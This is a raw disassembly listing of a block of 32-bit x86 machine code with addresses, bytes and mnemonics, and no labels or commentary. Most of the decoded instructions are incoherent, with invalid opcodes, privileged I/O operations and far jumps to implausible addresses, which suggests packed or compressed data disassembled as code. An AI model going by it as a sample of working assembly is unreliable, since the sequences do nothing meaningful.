  422127:	8e 00                	mov    (%eax),%es
  422129:	de 10                	ficoms (%eax)
  42212b:	be e6 39 da 91       	mov    $0x91da39e6,%esi
  422130:	a2 c9 73 10 b3       	mov    %al,0xb31073c9
  422135:	ca 4a 5e             	lret   $0x5e4a
  422138:	f1                   	int1
  422139:	2d b0 8f 51 d7       	sub    $0xd7518fb0,%eax
  42213e:	cb                   	lret
  42213f:	0c f5                	or     $0xf5,%al
  422141:	9f                   	lahf
  422142:	22 35 6a bb 04 ba    	and    0xba04bb6a,%dh
  422148:	16                   	push   %ss
  422149:	3b 9f fd b7 1e ea    	cmp    -0x15e14803(%edi),%ebx
  42214f:	14 08                	adc    $0x8,%al
  422151:	17                   	pop    %ss
  422152:	62 bf 5b a4 d3 e8    	bound  %edi,-0x172c5ba5(%edi)
  422158:	12 67 be             	adc    -0x42(%edi),%ah
  42215b:	75 ff                	jne    0x42215c
  42215d:	80 b2 38 f0 b0 e5 37 	xorb   $0x37,-0x1a4f0fc8(%edx)
  422164:	11 00                	adc    %eax,(%eax)
  422166:	ca 33 e0             	lret   $0xe033
  422169:	22 1c b1             	and    (%ecx,%esi,4),%bl
  42216c:	9a 39 df 81 00 52 42 	lcall  $0x4252,$0x81df39
  422173:	7f 36                	jg     0x4221ab
  422175:	e6 0b                	out    %al,$0xb
  422177:	18 3b                	sbb    %bh,(%ebx)
  422179:	50                   	push   %eax
  42217a:	66 cf                	iretw
  42217c:	26 3f                	es aas
  42217e:	8e c5                	mov    %ebp,%es
  422180:	17                   	pop    %ss
  422181:	60                   	pusha
  422182:	9d                   	popf
  422183:	5f                   	pop    %edi
  422184:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  422185:	e8 df fe e5 e4       	call   0xe5282069
  42218a:	f5                   	cmc
  42218b:	58                   	pop    %eax
  42218c:	98                   	cwtl
  42218d:	3a 8b e2 8d 65 c3    	cmp    -0x3c9a721e(%ebx),%cl
  422193:	03 92 e5 1f 9c ef    	add    -0x1063e01b(%edx),%edx
  422199:	bf 1d ed 07 47       	mov    $0x4707ed1d,%edi
  42219e:	26 d2 af df 9c fa 58 	shrb   %cl,%es:0x58fa9cdf(%edi)
  4221a5:	f3 86 a2 35 08 7a c9 	xrelease xchg %ah,-0x3685f7cb(%edx)
  4221ac:	dd e7                	fucom  %st(7)
  4221ae:	fe                   	(bad)
  4221af:	6d                   	insl   (%dx),%es:(%edi)
  4221b0:	79 ec                	jns    0x42219e
  4221b2:	a0 68 5f ef b7       	mov    0xb7ef5f68,%al
  4221b7:	43                   	inc    %ebx
  4221b8:	7c 2c                	jl     0x4221e6
  4221ba:	b5 77                	mov    $0x77,%ch
  4221bc:	1c 40                	sbb    $0x40,%al
  4221be:	2f                   	das
  4221bf:	dd e3                	fucom  %st(3)
  4221c1:	51                   	push   %ecx
  4221c2:	d9 d6                	(bad)
  4221c4:	b8 6a 23 0f b4       	mov    $0xb40f236a,%eax
  4221c9:	b9 55 b0 d5 46       	mov    $0x46d5b055,%ecx
  4221ce:	bd 01 9b 35 47       	mov    $0x47359b01,%ebp
  4221d3:	43                   	inc    %ebx
  4221d4:	b3 ae                	mov    $0xae,%bl
  4221d6:	76 ab                	jbe    0x422183
  4221d8:	28 17                	sub    %dl,(%edi)
  4221da:	0d 8d af 98 93       	or     $0x9398af8d,%eax
  4221df:	8e dd                	mov    %ebp,%ds
  4221e1:	68 9e 14 0a 72       	push   $0x720a149e
  4221e6:	e7 be                	out    %eax,$0xbe
  4221e8:	df 1e                	fistps (%esi)
  4221ea:	e9 85 87 97 1e       	jmp    0x1ed9a974
  4221ef:	d8 ac 6c 76 9a a1 9b 	fsubrs -0x645e658a(%esp,%ebp,2)
  4221f6:	2f                   	das
  4221f7:	05 0e 5f 33 53       	add    $0x53335f0e,%eax
  4221fc:	3a bb b4 fc c0 81    	cmp    -0x7e3f034c(%ebx),%bh
  422202:	6c                   	insb   (%dx),%es:(%edi)
  422203:	85 5c ca 13          	test   %ebx,0x13(%edx,%ecx,8)
  422207:	20 09                	and    %cl,(%ecx)
  422209:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42220a:	9e                   	sahf
  42220b:	7f 55                	jg     0x422262
  42220d:	96                   	xchg   %eax,%esi
  42220e:	94                   	xchg   %eax,%esp
  42220f:	89 c8                	mov    %ecx,%eax
  422211:	f1                   	int1
  422212:	16                   	push   %ss
  422213:	fb                   	sti
  422214:	da 9e 97 12 fd 0a    	ficompl 0xafd1297(%esi)
  42221a:	19 83 2b 02 ad e7    	sbb    %eax,-0x1852fdd5(%ebx)
  422220:	b9 08 c0 c8 5b       	mov    $0x5bc8c008,%ecx
  422225:	da d1                	fcmovbe %st(1),%st
  422227:	dd 9e 8c 49 c6 e6    	fstpl  -0x1939b674(%esi)
  42222d:	9b                   	fwait
  42222e:	c8 29 8e 2e          	enter  $0x8e29,$0x2e
  422232:	d5 50                	aad    $0x50
  422234:	6d                   	insl   (%dx),%es:(%edi)
  422235:	25 43 f9 36 b8       	and    $0xb836f943,%eax
  42223a:	96                   	xchg   %eax,%esi
  42223b:	0d a5 c2 a3 00       	or     $0xa3c2a5,%eax
  422240:	11 15 91 74 a2 5b    	adc    %edx,0x5ba27491
  422246:	35 18 82 16 50       	xor    $0x50168218,%eax
  42224b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42224c:	e5 9a                	in     $0x9a,%eax
  42224e:	f9                   	stc
  42224f:	d6                   	salc
  422250:	ec                   	in     (%dx),%al
  422251:	a8 60                	test   $0x60,%al
  422253:	a2 4c 1d 95 dc       	mov    %al,0xdc951d4c
  422258:	a3 45 e4 bd 45       	mov    %eax,0x45bde445
  42225d:	20 3a                	and    %bh,(%edx)
  42225f:	1d 41 f4 d0 3e       	sbb    $0x3ed0f441,%eax
  422264:	df 5c f4 57          	fistps 0x57(%esp,%esi,8)
  422268:	97                   	xchg   %eax,%edi
  422269:	c1 52 6a c4          	rcll   $0xc4,0x6a(%edx)
  42226d:	06                   	push   %es
  42226e:	14 3b                	adc    $0x3b,%al
  422270:	40                   	inc    %eax
  422271:	dd 35 39 a8 d0 f2    	fnsave 0xf2d0a839
  422277:	5f                   	pop    %edi
  422278:	49                   	dec    %ecx
  422279:	2d 8d 28 2a 77       	sub    $0x772a288d,%eax
  42227e:	44                   	inc    %esp
  42227f:	3a 74 cb a8          	cmp    -0x58(%ebx,%ecx,8),%dh
  422283:	e7 33                	out    %eax,$0x33
  422285:	11 1d c2 00 2d 0c    	adc    %ebx,0xc2d00c2
  42228b:	7c a7                	jl     0x422234
  42228d:	de 16                	ficoms (%esi)
  42228f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  422290:	3b 60 b5             	cmp    -0x4b(%eax),%esp
  422293:	5d                   	pop    %ebp
  422294:	f5                   	cmc
  422295:	ff                   	(bad)
  422296:	7a a9                	jp     0x422241
  422298:	67 df 68 a5          	fildll -0x5b(%bx,%si)
  42229c:	46                   	inc    %esi
  42229d:	9c                   	pushf
  42229e:	dc 55 d0             	fcoml  -0x30(%ebp)
  4222a1:	49                   	dec    %ecx
  4222a2:	8d ab c3 7e a6 24    	lea    0x24a67ec3(%ebx),%ebp
  4222a8:	9c                   	pushf
  4222a9:	69 a6 e8 5e 35 da 68 	imul   $0xdae19968,-0x25caa118(%esi),%esp
  4222b0:	99 e1 da 
  4222b3:	42                   	inc    %edx
  4222b4:	66 ed                	in     (%dx),%ax
  4222b6:	30 c8                	xor    %cl,%al
  4222b8:	05 d9 ca 19 ed       	add    $0xed19cad9,%eax
  4222bd:	c8 59 b9 61          	enter  $0xb959,$0x61
  4222c1:	ce                   	into
  4222c2:	ad                   	lods   %ds:(%esi),%eax
  4222c3:	8c d1                	mov    %ss,%ecx
  4222c5:	9a dd 92 44 6f c9 41 	lcall  $0x41c9,$0x6f4492dd
  4222cc:	b5 64                	mov    $0x64,%ch
  4222ce:	90                   	nop
  4222cf:	54                   	push   %esp
  4222d0:	28 46 85             	sub    %al,-0x7b(%esi)
  4222d3:	e5 99                	in     $0x99,%eax
  4222d5:	36 1a 06             	sbb    %ss:(%esi),%al
  4222d8:	0c 91                	or     $0x91,%al
  4222da:	9e                   	sahf
  4222db:	38 40 61             	cmp    %al,0x61(%eax)
  4222de:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4222df:	c7                   	(bad)
  4222e0:	d7                   	xlat   %ds:(%ebx)
  4222e1:	98                   	cwtl
  4222e2:	01 da                	add    %ebx,%edx
  4222e4:	7a ae                	jp     0x422294
  4222e6:	b3 30                	mov    $0x30,%bl
  4222e8:	34 d9                	xor    $0xd9,%al
  4222ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4222eb:	b4 24                	mov    $0x24,%ah
  4222ed:	14 17                	adc    $0x17,%al
  4222ef:	71 ad                	jno    0x42229e
  4222f1:	32 c1                	xor    %cl,%al
  4222f3:	03 f7                	add    %edi,%esi
  4222f5:	10 f8                	adc    %bh,%al
  4222f7:	bb 9c 43 6d 70       	mov    $0x706d439c,%ebx
  4222fc:	16                   	push   %ss
  4222fd:	62 a6 4c 84 07 e2    	bound  %esp,-0x1df87bb4(%esi)
  422303:	8b 4e 1b             	mov    0x1b(%esi),%ecx
  422306:	18 48 65             	sbb    %cl,0x65(%eax)
  422309:	16                   	push   %ss
  42230a:	0c 57                	or     $0x57,%al
  42230c:	2b 2a                	sub    (%edx),%ebp
  42230e:	bb fc 88 da d5       	mov    $0xd5da88fc,%ebx
  422313:	1a e9                	sbb    %cl,%ch
  422315:	3b a9 0d 21 d9 94    	cmp    -0x6b26def3(%ecx),%ebp
  42231b:	bd 54 dc 3f 9a       	mov    $0x9a3fdc54,%ebp
  422320:	c2 8f b8             	ret    $0xb88f
  422323:	56                   	push   %esi
  422324:	56                   	push   %esi
  422325:	7d 46                	jge    0x42236d
  422327:	e2 f6                	loop   0x42231f
  422329:	7d 59                	jge    0x422384
  42232b:	db 55 93             	fistl  -0x6d(%ebp)
  42232e:	b0 ad                	mov    $0xad,%al
  422330:	1e                   	push   %ds
  422331:	b4 be                	mov    $0xbe,%ah
  422333:	44                   	inc    %esp
  422334:	13 57 ac             	adc    -0x54(%edi),%edx
  422337:	7f 72                	jg     0x4223ab
  422339:	7d 61                	jge    0x42239c
  42233b:	7a 6c                	jp     0x4223a9
  42233d:	03 b0 36 5e 5e 48    	add    0x485e5e36(%eax),%esi
  422343:	5a                   	pop    %edx
  422344:	71 f8                	jno    0x42233e
  422346:	6f                   	outsl  %ds:(%esi),(%dx)
  422347:	5c                   	pop    %esp
  422348:	44                   	inc    %esp
  422349:	fc                   	cld
  42234a:	fd                   	std
  42234b:	99                   	cltd
  42234c:	17                   	pop    %ss
  42234d:	f4                   	hlt
  42234e:	d2 43 76             	rolb   %cl,0x76(%ebx)
  422351:	6c                   	insb   (%dx),%es:(%edi)
  422352:	d0 49 7f             	rorb   $1,0x7f(%ecx)
  422355:	88 d3                	mov    %dl,%bl
  422357:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  422358:	7e 1a                	jle    0x422374
  42235a:	17                   	pop    %ss
  42235b:	53                   	push   %ebx
  42235c:	0c d3                	or     $0xd3,%al
  42235e:	e4 86                	in     $0x86,%al
  422360:	61                   	popa
  422361:	f1                   	int1
  422362:	8b a1 c0 bc 0a 3a    	mov    0x3a0abcc0(%ecx),%esp
  422368:	d4 35                	aam    $0x35
  42236a:	cc                   	int3
  42236b:	18 96 ea cf 64 1c    	sbb    %dl,0x1c64cfea(%esi)
  422371:	b3 d4                	mov    $0xd4,%bl
  422373:	36 c6                	ss (bad)
  422375:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  422376:	21 e5                	and    %esp,%ebp
  422378:	51                   	push   %ecx
  422379:	55                   	push   %ebp
  42237a:	19 76 c0             	sbb    %esi,-0x40(%esi)
  42237d:	a3 2f ef fd 47       	mov    %eax,0x47fdef2f
  422382:	cb                   	lret
  422383:	97                   	xchg   %eax,%edi
  422384:	42                   	inc    %edx
  422385:	7c 33                	jl     0x4223ba
  422387:	13 65 b5             	adc    -0x4b(%ebp),%esp
  42238a:	5c                   	pop    %esp
  42238b:	8c d3                	mov    %ss,%ebx
  42238d:	15 ae a0 c9 8b       	adc    $0x8bc9a0ae,%eax
  422392:	51                   	push   %ecx
  422393:	10 4b d2             	adc    %cl,-0x2e(%ebx)
  422396:	d0 a4 e6 34 d7 59 0a 	shlb   $1,0xa59d734(%esi,%eiz,8)
  42239d:	28 e1                	sub    %ah,%cl
  42239f:	db 31                	(bad) (%ecx)
  4223a1:	83 0f 8c             	orl    $0xffffff8c,(%edi)
  4223a4:	00 0c 83             	add    %cl,(%ebx,%eax,4)
  4223a7:	a2 7e 2c ec 36       	mov    %al,0x36ec2c7e
  4223ac:	63 df                	arpl   %ebx,%edi
  4223ae:	14 4b                	adc    $0x4b,%al
  4223b0:	0d f4 d0 a7 ba       	or     $0xbaa7d0f4,%eax
  4223b5:	4c                   	dec    %esp
  4223b6:	c0 87 b7 32 75 fe 4f 	rolb   $0x4f,-0x18acd49(%edi)
  4223bd:	29 a1 5f 88 fa 71    	sub    %esp,0x71fa885f(%ecx)
  4223c3:	fc                   	cld
  4223c4:	02 e0                	add    %al,%ah
  4223c6:	9c                   	pushf
  4223c7:	2f                   	das
  4223c8:	d1 44 6f 68          	roll   $1,0x68(%edi,%ebp,2)
  4223cc:	b6 bd                	mov    $0xbd,%dh
  4223ce:	ef                   	out    %eax,(%dx)
  4223cf:	45                   	inc    %ebp
  4223d0:	ad                   	lods   %ds:(%esi),%eax
  4223d1:	82 67 1a 7f          	andb   $0x7f,0x1a(%edi)
  4223d5:	e5 2e                	in     $0x2e,%eax
  4223d7:	1c d8                	sbb    $0xd8,%al
  4223d9:	62 19                	bound  %ebx,(%ecx)
  4223db:	65 ce                	gs into
  4223dd:	20 c8                	and    %cl,%al
  4223df:	bc 21 c3 38 13       	mov    $0x1338c321,%esp
  4223e4:	bc d6 9a 68 41       	mov    $0x41689ad6,%esp
  4223e9:	c5 21                	lds    (%ecx),%esp
  4223eb:	22 87 61 ee d9 0a    	and    0xad9ee61(%edi),%al
  4223f1:	d3 c9                	ror    %cl,%ecx
  4223f3:	dd 99 07 83 7e 65    	fstpl  0x657e8307(%ecx)
  4223f9:	ad                   	lods   %ds:(%esi),%eax
  4223fa:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4223fb:	d5 88                	aad    $0x88
  4223fd:	c1 7b 26 0c          	sarl   $0xc,0x26(%ebx)
  422401:	1f                   	pop    %ds
  422402:	22 c7                	and    %bh,%al
  422404:	86 ea                	xchg   %ch,%dl
  422406:	8f                   	(bad)
  422407:	2d 44 58 16 f8       	sub    $0xf8165844,%eax
  42240c:	5d                   	pop    %ebp
  42240d:	20 da                	and    %bl,%dl
  42240f:	4a                   	dec    %edx
  422410:	8a 3a                	mov    (%edx),%bh
  422412:	a9 4d 4b 6e b0       	test   $0xb06e4b4d,%eax
  422417:	4d                   	dec    %ebp
  422418:	ac                   	lods   %ds:(%esi),%al
  422419:	d9 24 60             	fldenv (%eax,%eiz,2)
  42241c:	1f                   	pop    %ds
  42241d:	bf 6a 89 07 56       	mov    $0x5607896a,%edi
  422422:	89 3c 3d 65 a6 18 37 	mov    %edi,0x3718a665(,%edi,1)
  422429:	29 69 8f             	sub    %ebp,-0x71(%ecx)
  42242c:	c5 f5 8e             	(bad)
  42242f:	53                   	push   %ebx
  422430:	15 c9 63 e1 70       	adc    $0x70e163c9,%eax
  422435:	5d                   	pop    %ebp
  422436:	3e 5a                	ds pop %edx
  422438:	da d6                	fcmovbe %st(6),%st
  42243a:	c8 9f 2f 24          	enter  $0x2f9f,$0x24
  42243e:	a2 d5 95 6f d7       	mov    %al,0xd76f95d5
  422443:	57                   	push   %edi
  422444:	72 45                	jb     0x42248b
  422446:	ca 9b 09             	lret   $0x99b
  422449:	c9                   	leave
  42244a:	7c 03                	jl     0x42244f
  42244c:	6c                   	insb   (%dx),%es:(%edi)
  42244d:	db 4e c3             	fisttpl -0x3d(%esi)
  422450:	3a fd                	cmp    %ch,%bh
  422452:	74 fd                	je     0x422451
  422454:	72 b4                	jb     0x42240a
  422456:	43                   	inc    %ebx
  422457:	52                   	push   %edx
  422458:	ca a9 ba             	lret   $0xbaa9
  42245b:	3e 7e 45             	jle,pt 0x4224a3
  42245e:	f6 18                	negb   (%eax)
  422460:	dc b2 36 bc a2 fe    	fdivl  -0x15d43ca(%edx)
  422466:	6e                   	outsb  %ds:(%esi),(%dx)
  422467:	a8 35                	test   $0x35,%al
  422469:	ad                   	lods   %ds:(%esi),%eax
  42246a:	6c                   	insb   (%dx),%es:(%edi)
  42246b:	df ee                	fucomip %st(6),%st
  42246d:	72 2f                	jb     0x42249e
  42246f:	68 79 69 f5 50       	push   $0x50f56979
  422474:	6a d2                	push   $0xffffffd2
  422476:	1c 0c                	sbb    $0xc,%al
  422478:	88 1d b2 0b 1d 70    	mov    %bl,0x701d0bb2
  42247e:	a3 40 4d 4c 3e       	mov    %eax,0x3e4c4d40
  422483:	b6 76                	mov    $0x76,%dh
  422485:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  422486:	59                   	pop    %ecx
  422487:	c1 14 83 9c          	rcll   $0x9c,(%ebx,%eax,4)
  42248b:	19 d2                	sbb    %edx,%edx
  42248d:	0e                   	push   %cs
  42248e:	1e                   	push   %ds
  42248f:	36 ba 74 f9 e6 3a    	ss mov $0x3ae6f974,%edx
  422495:	65 83 c3 d8          	gs add $0xffffffd8,%ebx
  422499:	7d dd                	jge    0x422478
  42249b:	c9                   	leave
  42249c:	2f                   	das
  42249d:	d1 36                	shll   $1,(%esi)
  42249f:	a2 13 dc b0 3d       	mov    %al,0x3db0dc13
  4224a4:	47                   	inc    %edi
  4224a5:	3c 15                	cmp    $0x15,%al
  4224a7:	ad                   	lods   %ds:(%esi),%eax
  4224a8:	b5 f7                	mov    $0xf7,%ch
  4224aa:	ad                   	lods   %ds:(%esi),%eax
  4224ab:	69 48 ca 40 72 fc 91 	imul   $0x91fc7240,-0x36(%eax),%ecx
  4224b2:	e0 1b                	loopne 0x4224cf
  4224b4:	62 35 8e 18 fd 30    	bound  %esi,0x30fd188e
  4224ba:	c7 c7 2c 1a ad fc    	mov    $0xfcad1a2c,%edi
  4224c0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4224c1:	0e                   	push   %cs
  4224c2:	52                   	push   %edx
  4224c3:	3e 7e 71             	jle,pt 0x422537
  4224c6:	81 9c a0 56 4c e0 16 	sbbl   $0xa990ed81,0x16e04c56(%eax,%eiz,4)
  4224cd:	81 ed 90 a9 
  4224d1:	9a f3 a0 9b fb d3 65 	lcall  $0x65d3,$0xfb9ba0f3
  4224d8:	d5 1c                	aad    $0x1c
  4224da:	b1 f9                	mov    $0xf9,%cl
  4224dc:	7b 81                	jnp    0x42245f
  4224de:	29 30                	sub    %esi,(%eax)
  4224e0:	51                   	push   %ecx
  4224e1:	96                   	xchg   %eax,%esi
  4224e2:	28 49 32             	sub    %cl,0x32(%ecx)
  4224e5:	1a 3a                	sbb    (%edx),%bh
  4224e7:	90                   	nop
  4224e8:	90                   	nop
  4224e9:	b5 aa                	mov    $0xaa,%ch
  4224eb:	a2 4d 94 03 d7       	mov    %al,0xd703944d
  4224f0:	95                   	xchg   %eax,%ebp
  4224f1:	92                   	xchg   %eax,%edx
  4224f2:	ce                   	into
  4224f3:	4a                   	dec    %edx
  4224f4:	42                   	inc    %edx
  4224f5:	77 36                	ja     0x42252d
  4224f7:	fa                   	cli
  4224f8:	b9 46 61 1c 05       	mov    $0x51c6146,%ecx
  4224fd:	e8 18 8b 66 e2       	call   0xe2a8b01a
  422502:	b7 81                	mov    $0x81,%bh
  422504:	67 6d                	insl   (%dx),%es:(%di)
  422506:	e7 9b                	out    %eax,$0x9b
  422508:	64 48                	fs dec %eax
  42250a:	ad                   	lods   %ds:(%esi),%eax
  42250b:	04 03                	add    $0x3,%al
  42250d:	c2 8d b6             	ret    $0xb68d
  422510:	38 79 91             	cmp    %bh,-0x6f(%ecx)
  422513:	d6                   	salc
  422514:	4f                   	dec    %edi
  422515:	1b 5b cf             	sbb    -0x31(%ebx),%ebx
  422518:	29 1b                	sub    %ebx,(%ebx)
  42251a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42251b:	d8 43 1a             	fadds  0x1a(%ebx)
  42251e:	e3 3a                	jecxz  0x42255a
  422520:	5c                   	pop    %esp
  422521:	ba 8d 45 f5 36       	mov    $0x36f5458d,%edx
  422526:	7f 65                	jg     0x42258d
  422528:	c3                   	ret
  422529:	cf                   	iret
  42252a:	d6                   	salc
  42252b:	ce                   	into
  42252c:	92                   	xchg   %eax,%edx
  42252d:	27                   	daa
  42252e:	a0 9e 9c 25 59       	mov    0x59259c9e,%al
  422533:	65 9e                	gs sahf
  422535:	fe                   	(bad)
  422536:	53                   	push   %ebx
  422537:	f0 35 b1 8d d9 2e    	lock xor $0x2ed98db1,%eax
  42253d:	8c e4                	mov    %fs,%esp
  42253f:	32 d0                	xor    %al,%dl
  422541:	1f                   	pop    %ds
  422542:	69 bc 27 0e f5 43 fc 	imul   $0x89678d42,-0x3bc0af2(%edi,%eiz,1),%edi
  422549:	42 8d 67 89 
  42254d:	c5 17                	lds    (%edi),%edx
  42254f:	eb e9                	jmp    0x42253a
  422551:	cf                   	iret
  422552:	65 cf                	gs iret
  422554:	2a 82 58 d6 44 f0    	sub    -0xfbb29a8(%edx),%al
  42255a:	3a 17                	cmp    (%edi),%dl
  42255c:	32 d7                	xor    %bh,%dl
  42255e:	49                   	dec    %ecx
  42255f:	bf 44 03 92 e6       	mov    $0xe6920344,%edi
  422564:	56                   	push   %esi
  422565:	22 bf 86 3c 52 b9    	and    -0x46adc37a(%edi),%bh
  42256b:	bd f9 33 73 17       	mov    $0x177333f9,%ebp
  422570:	71 dc                	jno    0x42254e
  422572:	55                   	push   %ebp
  422573:	75 63                	jne    0x4225d8
  422575:	96                   	xchg   %eax,%esi
  422576:	2b 5a 5f             	sub    0x5f(%edx),%ebx
  422579:	3e e6 2b             	ds out %al,$0x2b
  42257c:	ce                   	into
  42257d:	6e                   	outsb  %ds:(%esi),(%dx)
  42257e:	b0 1a                	mov    $0x1a,%al
  422580:	a8 f5                	test   $0xf5,%al
  422582:	e8 60 f6 7e 23       	call   0x23c11be7
  422587:	52                   	push   %edx
  422588:	5a                   	pop    %edx
  422589:	5b                   	pop    %ebx
  42258a:	ed                   	in     (%dx),%eax
  42258b:	93                   	xchg   %eax,%ebx
  42258c:	69 2b bc 64 63 9b    	imul   $0x9b6364bc,(%ebx),%ebp
  422592:	d2 21                	shlb   %cl,(%ecx)
  422594:	f5                   	cmc
  422595:	6c                   	insb   (%dx),%es:(%edi)
  422596:	83 06 9d             	addl   $0xffffff9d,(%esi)
  422599:	06                   	push   %es
  42259a:	13 46 9d             	adc    -0x63(%esi),%eax
  42259d:	d0 6e 0f             	shrb   $1,0xf(%esi)
  4225a0:	02 dc                	add    %ah,%bl
  4225a2:	fe                   	(bad)
  4225a3:	29 c3                	sub    %eax,%ebx
  4225a5:	ec                   	in     (%dx),%al
  4225a6:	bf 14 45 1b 52       	mov    $0x521b4514,%edi
  4225ab:	4a                   	dec    %edx
  4225ac:	ad                   	lods   %ds:(%esi),%eax
  4225ad:	16                   	push   %ss
  4225ae:	93                   	xchg   %eax,%ebx
  4225af:	b8 4a 2c a8 e3       	mov    $0xe3a82c4a,%eax
  4225b4:	5b                   	pop    %ebx
  4225b5:	f1                   	int1
  4225b6:	f6 e0                	mul    %al
  4225b8:	47                   	inc    %edi
  4225b9:	22 26                	and    (%esi),%ah
  4225bb:	ef                   	out    %eax,(%dx)
  4225bc:	55                   	push   %ebp
  4225bd:	64 56                	fs push %esi
  4225bf:	f7 f0                	div    %eax
  4225c1:	68 53 65 56 56       	push   $0x56566553
  4225c6:	4b                   	dec    %ebx
  4225c7:	c0 8f ca 35 ab f5 0a 	rorb   $0xa,-0xa54ca36(%edi)
  4225ce:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4225cf:	90                   	nop
  4225d0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4225d1:	be dc 8f 0f f2       	mov    $0xf20f8fdc,%esi
  4225d6:	45                   	inc    %ebp
  4225d7:	ee                   	out    %al,(%dx)
  4225d8:	be a9 5d c5 8d       	mov    $0x8dc55da9,%esi
  4225dd:	42                   	inc    %edx
  4225de:	c7                   	(bad)
  4225df:	2e 23 00             	and    %cs:(%eax),%eax
  4225e2:	98                   	cwtl
  4225e3:	cb                   	lret
  4225e4:	e9 79 d7 66 80       	jmp    0x80a8fd62
  4225e9:	ad                   	lods   %ds:(%esi),%eax
  4225ea:	3a a9 28 a4 b0 47    	cmp    0x47b0a428(%ecx),%ch
  4225f0:	ba 2b 61 6d 18       	mov    $0x186d612b,%edx
  4225f5:	58                   	pop    %eax
  4225f6:	28 31                	sub    %dh,(%ecx)
  4225f8:	5e                   	pop    %esi
  4225f9:	62 6d c4             	bound  %ebp,-0x3c(%ebp)
  4225fc:	4d                   	dec    %ebp
  4225fd:	c6 38                	xabort $0x38,(bad)
  4225ff:	ad                   	lods   %ds:(%esi),%eax
  422600:	73 1f                	jae    0x422621
  422602:	f2 84 fa             	repnz test %bh,%dl
  422605:	5a                   	pop    %edx
  422606:	1a b9 1b 49 51 c7    	sbb    -0x38aeb6e5(%ecx),%bh
  42260c:	55                   	push   %ebp
  42260d:	e1 c0                	loope  0x4225cf
  42260f:	8e c8                	mov    %eax,%cs
  422611:	89 35 26 ec 1a be    	mov    %esi,0xbe1aec26
  422617:	57                   	push   %edi
  422618:	bc d7 fa 41 11       	mov    $0x1141fad7,%esp
  42261d:	05 4a b0 db 5a       	add    $0x5adbb04a,%eax
  422622:	02 07                	add    (%edi),%al
  422624:	6d                   	insl   (%dx),%es:(%edi)
  422625:	c7                   	(bad)
  422626:	c8 e7 48 fc          	enter  $0x48e7,$0xfc
  42262a:	6d                   	insl   (%dx),%es:(%edi)
  42262b:	2b 8e cc 63 e6 db    	sub    -0x24199c34(%esi),%ecx
  422631:	ba 51 7c 19 ff       	mov    $0xff197c51,%edx
  422636:	1d ec 3e f8 4b       	sbb    $0x4bf83eec,%eax
  42263b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42263c:	ae                   	scas   %es:(%edi),%al
  42263d:	a3 a6 3e 64 2d       	mov    %eax,0x2d643ea6
  422642:	91                   	xchg   %eax,%ecx
  422643:	66 6f                	outsw  %ds:(%esi),(%dx)
  422645:	1a 81 06 00 db f4    	sbb    -0xb24fffa(%ecx),%al
  42264b:	03 fa                	add    %edx,%edi
  42264d:	ab                   	stos   %eax,%es:(%edi)
  42264e:	ef                   	out    %eax,(%dx)
  42264f:	e0 e0                	loopne 0x422631
  422651:	75 e1                	jne    0x422634
  422653:	8a 5a 55             	mov    0x55(%edx),%bl
  422656:	67 44                	addr16 inc %esp
  422658:	27                   	daa
  422659:	16                   	push   %ss
  42265a:	f0 1c 58             	lock sbb $0x58,%al
  42265d:	42                   	inc    %edx
  42265e:	2b c6                	sub    %esi,%eax
  422660:	42                   	inc    %edx
  422661:	82 3c d5 23 28 34 d0 	cmpb   $0xc7,-0x2fcbd7dd(,%edx,8)
  422668:	c7 
  422669:	f3 93                	repz xchg %eax,%ebx
  42266b:	a1 05 a9 44 12       	mov    0x1244a905,%eax
  422670:	18 b8 0c ec 02 d6    	sbb    %bh,-0x29fd13f4(%eax)
  422676:	eb 19                	jmp    0x422691
  422678:	75 f4                	jne    0x42266e
  42267a:	94                   	xchg   %eax,%esp
  42267b:	77 31                	ja     0x4226ae
  42267d:	08 4c 05 58          	or     %cl,0x58(%ebp,%eax,1)
  422681:	61                   	popa
  422682:	51                   	push   %ecx
  422683:	64 db 8e 55 63 1f b4 	fisttpl %fs:-0x4be09cab(%esi)
  42268a:	cb                   	lret
  42268b:	44                   	inc    %esp
  42268c:	63 b0 04 e5 f7 85    	arpl   %esi,-0x7a081afc(%eax)
  422692:	0a fc                	or     %ah,%bh
  422694:	f2 e6 b2             	repnz out %al,$0xb2
  422697:	d1 3d b9 66 f5 e5    	sarl   $1,0xe5f566b9
  42269d:	e1 21                	loope  0x4226c0
  42269f:	04 eb                	add    $0xeb,%al
  4226a1:	00 fe                	add    %bh,%dh
  4226a3:	ea 40 a9 1c be 43 6d 	ljmp   $0x6d43,$0xbe1ca940
  4226aa:	a8 e6                	test   $0xe6,%al
  4226ac:	d3 7c 0b b1          	sarl   %cl,-0x4f(%ebx,%ecx,1)
  4226b0:	71 5e                	jno    0x422710
  4226b2:	92                   	xchg   %eax,%edx
  4226b3:	ab                   	stos   %eax,%es:(%edi)
  4226b4:	89 b6 fc db 74 7c    	mov    %esi,0x7c74dbfc(%esi)
  4226ba:	dc 09                	fmull  (%ecx)
  4226bc:	cb                   	lret
  4226bd:	18 c3                	sbb    %al,%bl
  4226bf:	64 f5                	fs cmc
  4226c1:	b8 9f 25 f2 5e       	mov    $0x5ef2259f,%eax
  4226c6:	71 00                	jno    0x4226c8
  4226c8:	35 f1 42 b7 32       	xor    $0x32b742f1,%eax
  4226cd:	39 a3 b4 c8 27 a2    	cmp    %esp,-0x5dd8374c(%ebx)
  4226d3:	af                   	scas   %es:(%edi),%eax
  4226d4:	d2 02                	rolb   %cl,(%edx)
  4226d6:	b7 6c                	mov    $0x6c,%bh
  4226d8:	9c                   	pushf
  4226d9:	93                   	xchg   %eax,%ebx
  4226da:	d5 32                	aad    $0x32
  4226dc:	da 05 fa 13 a9 17    	fiaddl 0x17a913fa
  4226e2:	f9                   	stc
  4226e3:	00 72 6c             	add    %dh,0x6c(%edx)
